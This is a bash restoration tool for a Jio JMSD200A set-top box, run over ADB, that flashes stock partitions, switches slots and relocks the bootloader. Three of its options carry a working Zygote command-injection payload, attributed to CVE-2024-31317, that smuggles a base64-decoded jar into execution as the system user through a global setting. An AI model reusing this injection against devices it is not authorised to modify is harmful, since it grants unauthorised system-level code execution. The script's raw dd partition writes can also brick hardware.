#!/bin/bash
# ============================================================================
# JioSTB JMSD200A — Stock Restoration & Rollback Tool
# ============================================================================
# Multi-layered restoration tool:
#   1) Direct Root DD Restore (Instant, when MagiskSU is active)
#   2) U-Boot Hardware USB Restore (No root required, works via CVE-2024-31317)
#   3) Instant Rollback to Slot A (Factory untouched hardware slot)
#   4) Complete All-Partition Factory Flash (boot, vendor_boot, dtbo, vbmeta)
#   5) Bootloader Relock & SELinux Enforce (Return to factory locked state)
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKUP_DIR="$SCRIPT_DIR/stock_backups"
TOOLS_DIR="$SCRIPT_DIR/tools"
JAR_FILE="$TOOLS_DIR/restore_env.jar"
STB_IP=""

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

log()  { echo -e "  ${GREEN}✓${NC} $*"; }
info() { echo -e "  ${CYAN}ℹ${NC} $*"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
err()  { echo -e "  ${RED}✗${NC} $*" >&2; exit 1; }

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --stb-ip IP       STB IP address (e.g. 192.168.29.184)"
    echo "  -h, --help        Show this help message"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --stb-ip) STB_IP="$2"; shift 2 ;;
        -h|--help) usage ;;
        *) warn "Unknown argument: $1"; shift ;;
    esac
done

echo -e "${CYAN}======================================================${NC}"
echo -e "${CYAN}      JMSD200A Master Stock Restoration Tool         ${NC}"
echo -e "${CYAN}======================================================${NC}"

# Check stock backups
[ -d "$BACKUP_DIR" ] || err "Stock backups directory missing: $BACKUP_DIR"
[ -f "$BACKUP_DIR/boot_b.img" ] || err "Missing $BACKUP_DIR/boot_b.img"

if [ -n "$STB_IP" ]; then
    info "Connecting to STB at $STB_IP:5555..."
    adb connect "$STB_IP:5555" || true
fi

DEVICE_COUNT=$(adb devices | grep -v "List" | grep "device$" | wc -l)
if [ "$DEVICE_COUNT" -eq 0 ]; then
    err "No ADB devices detected. Ensure STB is connected over LAN."
fi

TARGET_SERIAL=$(adb devices | grep -v "List" | grep "device$" | head -n 1 | awk '{print $1}')
log "Using ADB target: $TARGET_SERIAL"
ADB="adb -s $TARGET_SERIAL"

# Build restore_env.jar if missing
if [ ! -f "$JAR_FILE" ]; then
    info "Compiling restore_env.jar..."
    mkdir -p /tmp/build_restore
    javac --release 8 -d /tmp/build_restore "$SCRIPT_DIR/src/RestoreStockEnv.java"
    java -cp "$TOOLS_DIR/r8.jar" com.android.tools.r8.D8 --output "$JAR_FILE" /tmp/build_restore/*.class
    rm -rf /tmp/build_restore
fi

# Detect current root state
IS_ROOTED=false
if $ADB shell "su -c 'id' 2>/dev/null" | grep -q "uid=0(root)"; then
    IS_ROOTED=true
    log "Device Status: Currently Rooted (MagiskSU Active)"
else
    info "Device Status: Not Rooted / Stock User Mode"
fi

CURRENT_SLOT=$($ADB shell getprop ro.boot.slot_suffix 2>/dev/null | tr -d '\r')
log "Active Slot: $CURRENT_SLOT"

echo ""
echo -e "${BOLD}Select Restoration Method:${NC}"
echo "  1) [Direct Root] Flash stock boot_b.img via dd (Fastest, 10s)"
echo "  2) [U-Boot USB] Hardware restore stock boot_b.img (No root needed)"
echo "  3) [Slot A Rollback] Switch active slot to untouched factory Slot A"
echo "  4) [Full eMMC Flash] Flash all partitions (boot, vendor_boot, dtbo, vbmeta)"
echo "  5) [Relock & Enforce] Lock bootloader and set SELinux enforcing"
echo "  q) Quit"
echo ""
read -rp "Enter choice [1-5, q]: " CHOICE

case "$CHOICE" in
    1)
        if [ "$IS_ROOTED" != true ]; then
            err "Option 1 requires active root (su). Use Option 2 for unrooted hardware restore."
        fi
        echo ""
        info "Running Direct Root DD Restore..."
        USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
        
        if [ -n "$USB_MOUNT" ] && $ADB shell "[ -f $USB_MOUNT/stock_boot_b.img ]" 2>/dev/null; then
            info "Using stock image on USB: $USB_MOUNT/stock_boot_b.img"
            $ADB shell "su -c 'dd if=$USB_MOUNT/stock_boot_b.img of=/dev/block/by-name/boot_b bs=4096 && sync'"
        else
            info "Pushing local backup to STB staging..."
            $ADB push "$BACKUP_DIR/boot_b.img" "/data/local/tmp/stock_boot_b.img"
            $ADB shell "su -c 'dd if=/data/local/tmp/stock_boot_b.img of=/dev/block/by-name/boot_b bs=4096 && sync'"
            $ADB shell "rm -f /data/local/tmp/stock_boot_b.img"
        fi
        log "Stock boot_b written to eMMC."
        info "Rebooting STB to stock..."
        $ADB reboot
        log "Reboot dispatched. Box will boot into stock unrooted Android."
        ;;

    2)
        echo ""
        info "Running U-Boot Hardware USB Restore..."
        USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
        [ -n "$USB_MOUNT" ] || err "FAT32 USB drive not detected in /storage/."
        
        info "Ensuring stock_boot_b.img is present on USB drive..."
        $ADB push "$BACKUP_DIR/boot_b.img" "$USB_MOUNT/stock_boot_b.img"
        $ADB push "$BACKUP_DIR/boot_b.img" "$USB_MOUNT/boot_b.img"
        
        # Inject restore_cmd via CVE-2024-31317
        info "Rebooting for clean Zygote session..."
        $ADB reboot
        $ADB wait-for-device
        while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do sleep 1; done
        
        JARB64=$(base64 -w0 "$JAR_FILE")
        CMD="echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / RestoreStockEnv flash_stock"
        PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")
        
        info "Configuring U-Boot restore_cmd via Zygote injection..."
        $ADB shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'"
        $ADB shell "am force-stop com.android.tv.settings"
        sleep 1
        $ADB shell "am start -n com.android.tv.settings/.MainSettings" >/dev/null 2>&1
        sleep 3
        $ADB shell "settings delete global hidden_api_blacklist_exemptions"
        
        info "Rebooting STB to execute U-Boot restore from USB..."
        $ADB reboot
        log "STB is flashing stock boot_b from USB and booting stock Android."
        ;;

    3)
        echo ""
        info "Switching active slot to factory untouched Slot A..."
        if [ "$IS_ROOTED" = true ]; then
            $ADB shell "su -c '/system/bin/bootctl set-active-boot-slot 0'"
            $ADB reboot
            log "Switched to Slot A and rebooted."
        else
            JARB64=$(base64 -w0 "$JAR_FILE")
            CMD="echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / RestoreStockEnv slot_a"
            PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")
            $ADB shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'"
            $ADB shell "am force-stop com.android.tv.settings"
            sleep 1
            $ADB shell "am start -n com.android.tv.settings/.MainSettings" >/dev/null 2>&1
            sleep 3
            $ADB shell "settings delete global hidden_api_blacklist_exemptions"
            $ADB reboot
            log "Slot A activated. STB rebooted."
        fi
        ;;

    4)
        if [ "$IS_ROOTED" != true ]; then
            err "Full partition re-flash via dd requires root. Please boot stock via Option 2 or Option 3 first."
        fi
        echo ""
        warn "This will flash ALL stock partitions: boot_b, vendor_boot_b, dtbo_b, vbmeta_b, boot_a."
        read -rp "Type RESTORE to proceed: " CONFIRM
        [ "$CONFIRM" = "RESTORE" ] || err "Aborted."
        
        PARTITIONS=("boot_b" "boot_a" "vendor_boot_b" "dtbo_b" "vbmeta_b")
        for p in "${PARTITIONS[@]}"; do
            IMG="$BACKUP_DIR/${p}.img"
            [ -f "$IMG" ] || err "Missing $IMG"
            info "Flashing $p..."
            $ADB push "$IMG" "/data/local/tmp/${p}.img"
            $ADB shell "su -c 'dd if=/data/local/tmp/${p}.img of=/dev/block/by-name/$p bs=4096 && sync'"
            $ADB shell "rm -f /data/local/tmp/${p}.img"
            log "Flashed $p."
        done
        info "All partitions restored. Rebooting STB..."
        $ADB reboot
        log "STB rebooted to 100% factory original state."
        ;;

    5)
        echo ""
        echo -e "${RED}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${NC}"
        echo -e "${RED}  CRITICAL WARNING: BOOTLOADER RE-LOCKING SAFETY GATE   ${NC}"
        echo -e "${RED}  Only re-lock if all partitions are 100% verified      ${NC}"
        echo -e "${RED}  stock! If any modified partition is present, AVB      ${NC}"
        echo -e "${RED}  will fail and PERMANENTLY BRICK the device!           ${NC}"
        echo -e "${RED}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${NC}"
        read -rp "Type RELOCK to confirm all images are stock and proceed: " CONFIRM_LOCK
        [ "$CONFIRM_LOCK" = "RELOCK" ] || err "Aborted."
        
        JARB64=$(base64 -w0 "$JAR_FILE")
        CMD="echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / RestoreStockEnv relock"
        PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")
        $ADB shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'"
        $ADB shell "am force-stop com.android.tv.settings"
        sleep 1
        $ADB shell "am start -n com.android.tv.settings/.MainSettings" >/dev/null 2>&1
        sleep 3
        $ADB shell "settings delete global hidden_api_blacklist_exemptions"
        $ADB reboot
        log "Bootloader relocked and SELinux set to enforcing. Box rebooted."
        ;;

    q|Q)
        echo "Exited."
        exit 0
        ;;
    *)
        err "Invalid selection."
        ;;
esac
